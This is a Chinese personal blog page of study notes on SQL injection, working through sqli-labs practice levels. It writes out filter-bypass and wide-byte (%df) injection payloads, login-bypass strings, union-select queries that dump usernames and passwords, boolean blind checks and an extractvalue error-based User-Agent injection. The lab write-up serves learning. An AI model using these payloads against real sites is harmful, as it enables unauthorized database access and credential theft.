@@ -1,0 +1,159 @@
+<!DOCTYPE html><html lang="en" theme-mode="light"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Sql注入学习笔记#13 | Vincent</title><link rel="icon" type="image/x-icon" href="/favicon.ico"><script>var config = {"root":"/","search":{"preload":"all","activeHolder":"Enter here","blurHolder":"Search","noResult":"Data \"$0\" not found"},"code":{"codeInfo":"$0 - $1 lines","copy":"copy","copyFinish":"copied","expand":"expand"}}</script><script src="//unpkg.com/valine/dist/Valine.min.js"></script><script src="//unpkg.com/mermaid@9.2.2/dist/mermaid.min.js"></script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/brands.min.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/fontawesome.min.css"><link rel="stylesheet" href="/css/arknights.css"><script>if (window.localStorage.getItem('theme-mode') === 'light') document.documentElement.setAttribute('theme-mode', 'light')
+if (window.localStorage.getItem('theme-mode') === 'dark') document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
+ font-family: BenderLight;
+ src: local('Bender'), url("/font/BenderLight.ttf");
+}
+@font-face {
+ font-family: 'JetBrains Mono';
+ src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
+}
+@font-face {
+ font-family: 'Font Awesome 6 Brands';
+ src: local('Font Awesome 6 Brands'), url('/lib/fontawesome/fa-brands.woff2') format('woff2');
+}
+@font-face {
+ font-family: 'Font Awesome 6 Free';
+ src: local('Font Awesome 6 Free'), url('/lib/fontawesome/fa-regular.woff2') format('woff2');
+}</style><style>:root {
+  --dark-background: url('https://cdnjson.com/images/2023/05/14/bg.jpg');
+  --light-background: url('https://cdnjson.com/images/2023/05/14/bk.jpg');
+}</style><meta name="generator" content="Hexo 6.3.0"></head><body><div class="loading" style="opacity: 0"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><nav><div class="navBtn hide"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="Search" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li><li class="navItem"><a class="navBlock" href="/about/"><span class="navItemTitle">About</span></a></li></ol></nav></header><article><div id="post-bg"><div id="post-title"><h1>Sql注入学习笔记#13</h1><div id="post-info"><span>First Post: <div class="control"><time datetime="2023-06-09T02:28:37.000Z" id="date"> 2023-06-09</time></div></span><br><span>Last Update: <div class="control"><time datetime="2023-06-19T03:57:09.754Z" id="updated"> 2023-06-19</time></div></span></div></div><hr><div id="post-content"><p>这篇文章学习union 、select、宽字节过滤绕过</p>
+<p>以及一些打靶实战</p>
+<span id="more"></span>
+
+<h1 id="1-union、select过滤绕过"><a href="#1-union、select过滤绕过" class="headerlink" title="1 union、select过滤绕过"></a>1 union、select过滤绕过</h1><ol>
+<li>大小写绕过，union -&gt; UniON，select - &gt; SELecT</li>
+<li>复写过滤词，union - &gt; ununionion</li>
+</ol>
+<h2 id="1-1-Less27实战"><a href="#1-1-Less27实战" class="headerlink" title="1.1 Less27实战"></a>1.1 Less27实战</h2><p>构造如下语句就可以绕过过滤：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">?id=0&#x27;%0AunIon%0ASelecT%0A1,2,3%0Aand%0A&#x27;1&#x27;=&#x27;1<br></code></pre></td></tr></table></figure>
+
+<p>后面的就是老一套了</p>
+<p>这一关无法使用复写绕过</p>
+<h1 id="2-宽字节注入绕过"><a href="#2-宽字节注入绕过" class="headerlink" title="2 宽字节注入绕过"></a>2 宽字节注入绕过</h1>
+
+<h2 id="2-1-Less32实战"><a href="#2-1-Less32实战" class="headerlink" title="2.1 Less32实战"></a>2.1 Less32实战</h2><p>其实就是在单引号前面加个%df就好了</p>
+<p>构造如下语句</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">?id=1%df&#x27; order by 3--+    判断字段数<br><br>?id=-1%df&#x27; union select 1,2,3--+ 注出回显位<br><br>?id=-1%df&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()--+获取表名<br><br>?id=-1%df&#x27; union select 1,2,group_concat(id,username,password) from users --+   结束<br></code></pre></td></tr></table></figure>
+
+<h1 id="3-打靶实战"><a href="#3-打靶实战" class="headerlink" title="3 打靶实战"></a>3 打靶实战</h1><p>之前都是一遍看课一遍打靶的，</p>
+<p>up极大的制约了我的思路，</p>
+<p>所以接下来我觉得我有必要自己打几个靶场，</p>
+<p>我随便挑了几个：12，16，18，15，3，25</p>
+<h2 id="3-1-Less12-实战"><a href="#3-1-Less12-实战" class="headerlink" title="3.1 Less12 实战"></a>3.1 Less12 实战</h2><p>这是一个post注入，打开burp suite，</p>
+<p>构造万能密码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">uname=admin&#x27; or 1=1#&amp;passwd=123&amp;submit=Submit<br></code></pre></td></tr></table></figure>
+
+<p>不行，登录还是失败</p>
+<p>猜测是闭合的问题，换成双引号，</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">uname=admin&quot; or 1=1#&amp;passwd=123&amp;submit=Submit<br></code></pre></td></tr></table></figure>
+
+<p>这里就出现了报错，说明有戏，加个括号试试</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">uname=admin&quot;) or 1=1#&amp;passwd=123&amp;submit=Submit<br></code></pre></td></tr></table></figure>
+
+<p>这里成功登录了，现在开始爆库</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">uname=admin&quot;) order by 2#&amp;passwd=123&amp;submit=Submit<br></code></pre></td></tr></table></figure>
+
+<p>判断字段数为2</p>
+<p>后面的直接查询表中内容吧，懒得搞前面的了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">uname=-admin&quot;) union select 1,group_concat(id,username,password) from users#&amp;passwd=123&amp;submit=Submit<br></code></pre></td></tr></table></figure>
+
+<h2 id="3-2-Less16-实战"><a href="#3-2-Less16-实战" class="headerlink" title="3.2 Less16 实战"></a>3.2 Less16 实战</h2><p>同样是post注入，</p>
+<p>构造万能语句</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">uname=admin&#x27; or 1=1#&amp;passwd=123&amp;submit=Submit<br></code></pre></td></tr></table></figure>
+
+<p>登陆失败，修改闭合方式</p>
+<p>单引号双引号都不报错，</p>
+<p>这里就没办法判断闭合了，就几个括号加上单引号双引号蒙吧，</p>
+<p>fuzz一下发现是双引号加括号successfully login</p>
+<p>难道是布尔盲注？</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">uname=-admin&quot;) or 1=2#&amp;passwd=admin&amp;submit=Submit  不正常<br><br>uname=-admin&quot;) or 1=1#&amp;passwd=admin&amp;submit=Submit 正常<br></code></pre></td></tr></table></figure>
+
+<p>具备布尔盲注条件！</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">uname=-admin&quot;) or length(database())=8#&amp;passwd=admin&amp;submit=Submit 正常<br><br>uname=-admin&quot;) or length(database())=7#&amp;passwd=admin&amp;submit=Submit 不正常<br></code></pre></td></tr></table></figure>
+
+<p>后面的就是写脚本爆破了，略</p>
+<h2 id="3-3-Less18-实战"><a href="#3-3-Less18-实战" class="headerlink" title="3.3 Less18 实战"></a>3.3 Less18 实战</h2><p>万能密码失败，但是他这是个弱口令🤣用户名密码都是admin。。。。我测试了一下正常的直接succeed了</p>
+<p>登陆后的页面是告诉我是ua注入</p>
+<p>判断闭合为单引号+括号</p>
+<p>开始构造语句，这里蒙参数是3个</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">1&#x27;,2,extractvalue(1,concat(0x7e,(database()))))#   <br></code></pre></td></tr></table></figure>
+
+<p>成功获得回显，下一个，</p>
+<p>注：这里的构造payload最好的应该是：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&#x27; or extractvalue(1,concat(0x7e,(database())))) or &#x27;<br></code></pre></td></tr></table></figure>
+
+<h2 id="3-4-Less15-实战"><a href="#3-4-Less15-实战" class="headerlink" title="3.4 Less15 实战"></a>3.4 Less15 实战</h2><p>判断为布尔盲注</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">uname=-admin&#x27; or 1=1#&amp;passwd=admin&amp;submit=Submit  正常<br><br>uname=-admin&#x27; or 1=2#&amp;passwd=admin&amp;submit=Submit  不正常<br></code></pre></td></tr></table></figure>
+
+<p>和前面实操的Less16一样，只是修改了闭合方式而已，略</p>
+<h2 id="3-5-Less3-实战"><a href="#3-5-Less3-实战" class="headerlink" title="3.5 Less3 实战"></a>3.5 Less3 实战</h2><p>闭合为单引号括号</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">?id=1&#x27;) --+<br></code></pre></td></tr></table></figure>
+
+<p>后面老一套</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">?id=1&#x27;) order by 3--+<br>.......<br>?id=-1&#x27;) union select 1,2,group_concat(id,username,password) from users--+<br></code></pre></td></tr></table></figure>
+
+<h2 id="3-6-Less25-实战"><a href="#3-6-Less25-实战" class="headerlink" title="3.6 Less25 实战"></a>3.6 Less25 实战</h2><p>他嚣张的提示我的or和and被过滤了🤣</p>
+
+
+<ol>
+<li><p>大小写绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">?id=1&#x27; oRder by 3--+<br></code></pre></td></tr></table></figure>
+
+<p>被过滤了</p>
+</li>
+<li><p>复写字符</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">?id=1&#x27; oorrder by 3--+<br></code></pre></td></tr></table></figure>
+
+<p>没被过滤</p>
+<p>判断出字段数为3</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">.........<br>?id=-1&#x27; union select 1,2,group_concat(id,username,passwoorrd) from users--+<br></code></pre></td></tr></table></figure>
+
+<p>结束，就这？</p>
+<p>加一个靶场，less29！</p>
+</li>
+</ol>
+<h2 id="3-7-Less29-实战"><a href="#3-7-Less29-实战" class="headerlink" title="3.7 Less29 实战"></a>3.7 Less29 实战</h2><p>他再次嚣张的告诉我这一关被全世界最好的防火墙保护着🤣🤣🤣</p>
+
+
+<p>判断闭合，就是一个单引号</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">?id=-1&#x27; union select 1,2,group_concat(id,username,password) from users --+<br></code></pre></td></tr></table></figure>
+
+<p>?????直接就成功了？？</p>
+<p>防火墙防了个啥？？</p>
+<p>看了一下他的提示，发现他把空格引号这种字符都编码了，</p>
+<p>但是编码了有什么用吗？？</p>
+<p>不行，再加一个Less35吧</p>
+<h2 id="3-8-Less35-实战"><a href="#3-8-Less35-实战" class="headerlink" title="3.8 Less35 实战"></a>3.8 Less35 实战</h2><p>首先判断闭合，</p>
+<p>单引号双引号都报错了，</p>
+<p>难道是数字型注入没有闭合？</p>
+<p>还真是。。。。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">?id=1 and 1=2 union select 1,2,group_concat(id,username,password) from users<br></code></pre></td></tr></table></figure>
+
+<h1 id="4-最后"><a href="#4-最后" class="headerlink" title="4 最后"></a>4 最后</h1><p>这篇笔记主要复习了一下前面的内容，</p>
+<p>（好多靶场好像都是重复的……？）</p>
+<p>两个过滤绕过也就宽字节那个比较有用一些，</p>
+<p>前面的union、select绕过都是老一套了</p>
+<div id="paginator"></div></div><div id="post-footer"><div id="pages"><div class="footer-link" style="width: 50%;text-align:right;border-right:1px #fe2 solid"><a href="/2023/06/09/Sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-14/">← Next Sql注入学习笔记#14</a></div><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2023/06/08/Sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-12/">Sql注入学习笔记#12 Prev →</a></div></div></div><div id="comments"><div class="selector"><button class="valine-sel"></button></div><div id="valine"></div></div></div><div class="bottom-btn"><div><a id="to-top" onClick="scrolls.scrolltop();" title="To Top" style="opacity: 0; display: none;">∧</a><a id="to-index" href="#toc-div" title="To Catalog">≡</a><a id="color-mode" onClick="colorMode.change()" title="Change Theme"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="./img/logo.jpg" alt="Logo"></a><h1 id="Dr"><a href="/">Vincent</a></h1><div id="description"><p>不与无谓人争气</p></div></div><div id="aside-block"><div id="toc-div"><h1>Catalog</h1><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#1-union%E3%80%81select%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87"><span class="toc-number">1.</span> <span class="toc-text">1 union、select过滤绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-1-Less27%E5%AE%9E%E6%88%98"><span class="toc-number">1.1.</span> <span class="toc-text">1.1 Less27实战</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2-%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87"><span class="toc-number">2.</span> <span class="toc-text">2 宽字节注入绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#2-1-Less32%E5%AE%9E%E6%88%98"><span class="toc-number">2.1.</span> <span class="toc-text">2.1 Less32实战</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#3-%E6%89%93%E9%9D%B6%E5%AE%9E%E6%88%98"><span class="toc-number">3.</span> <span class="toc-text">3 打靶实战</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#3-1-Less12-%E5%AE%9E%E6%88%98"><span class="toc-number">3.1.</span> <span class="toc-text">3.1 Less12 实战</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-2-Less16-%E5%AE%9E%E6%88%98"><span class="toc-number">3.2.</span> <span class="toc-text">3.2 Less16 实战</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-3-Less18-%E5%AE%9E%E6%88%98"><span class="toc-number">3.3.</span> <span class="toc-text">3.3 Less18 实战</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-4-Less15-%E5%AE%9E%E6%88%98"><span class="toc-number">3.4.</span> <span class="toc-text">3.4 Less15 实战</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-5-Less3-%E5%AE%9E%E6%88%98"><span class="toc-number">3.5.</span> <span class="toc-text">3.5 Less3 实战</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-6-Less25-%E5%AE%9E%E6%88%98"><span class="toc-number">3.6.</span> <span class="toc-text">3.6 Less25 实战</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-7-Less29-%E5%AE%9E%E6%88%98"><span class="toc-number">3.7.</span> <span class="toc-text">3.7 Less29 实战</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-8-Less35-%E5%AE%9E%E6%88%98"><span class="toc-number">3.8.</span> <span class="toc-text">3.8 Less35 实战</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#4-%E6%9C%80%E5%90%8E"><span class="toc-number">4.</span> <span class="toc-text">4 最后</span></a></li></ol></div></div><footer><nobr>Published with <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> Theme <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr>by <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script src="/js/arknights.js"></script><script src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/js/pjax.js"></script><script class="pjax-js">reset= () => {new Valine({
+ el: '#valine'
+ , appId: 'HPascq2qxfVnEiu0BvuEltaD-gzGzoHsz'
+ , appKey: 'AKHEZyHQcEOLkAQk07kDBYgN' , placeholder: 'This comment is sent by Penguin Logistics.'
+ , path: window.location.pathname
+});code.findCode();
+document.querySelector('.lg-container')?.remove()
+lightGallery(document.getElementById('post-bg'), {
+  plugins: [lgZoom,lgThumbnail],
+  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
+ cacheBust: false,
+ selectors: ['title','article','#aside-block','.pjax-js'],
+ switches: {'article': Pjax.switches.sideBySide},
+ switchesOptions: {
+   'article': {
+     classNames: {
+       remove: "pjax-out",
+       add: "pjax-in"
+     }
+   }
+ }
+});
+document.addEventListener("pjax:complete", reset);reset()})</script></body></html>
